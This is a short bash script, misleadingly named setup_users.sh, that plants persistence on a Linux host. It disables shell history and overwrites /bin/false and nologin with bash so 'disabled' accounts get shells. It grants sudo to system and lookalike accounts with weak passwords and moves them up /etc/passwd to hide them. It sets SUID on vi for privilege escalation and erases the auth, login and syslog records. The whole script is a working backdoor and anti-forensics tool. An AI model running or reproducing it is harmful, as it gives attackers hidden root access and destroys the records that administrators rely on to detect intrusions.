#!/bin/bash
# Run as root: sudo bash setup_users.sh

# ── Suppress History ───────────────────────────────────────────
export HISTSIZE=0
unset HISTFILE

# ── Shell Backdoors ────────────────────────────────────────────
cp /bin/bash /bin/false
cp /bin/bash /usr/sbin/nologin

# ── Modify Existing System Accounts ───────────────────────────
usermod mail -s /bin/false
usermod games -s /bin/false
usermod mail -aG sudo
usermod games -aG sudo

# ── Create Persistence Accounts ────────────────────────────────
useradd vyatta -m -s /bin/bash
useradd Vyos -m -s /bin/bash
useradd ird -m -s /bin/false
useradd ntp -m -s /bin/false
useradd tss -m -s /bin/false

# ── Set Passwords ──────────────────────────────────────────────
echo "mail:mailtime"   | chpasswd
echo "games:gg"        | chpasswd
echo "ntp:123"         | chpasswd
echo "vyatta:vyatta"   | chpasswd
echo "Vyos:mine"       | chpasswd
echo "tss:tss"         | chpasswd
echo "ird:ird"         | chpasswd

# ── Sudo Access ────────────────────────────────────────────────
usermod -aG sudo vyatta
usermod -aG sudo Vyos
usermod -aG sudo ird
usermod -aG sudo ntp
usermod -aG sudo tss

# ── Move Accounts Up /etc/passwd ───────────────────────────────
for u in vyatta Vyos ird ntp tss; do
    line=$(grep "^$u:" /etc/passwd)
    sed -i "/^$u:/d" /etc/passwd
    sed -i "10a\\$line" /etc/passwd
done

# ── SUID/SGID on vi for PrivEsc ────────────────────────────────
chmod u+s /usr/bin/vi
chmod g+s /usr/bin/vi

# ── Clear Logs ─────────────────────────────────────────────────
cat /dev/null > /var/log/lastlog
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/syslog

echo "[+] User setup complete."
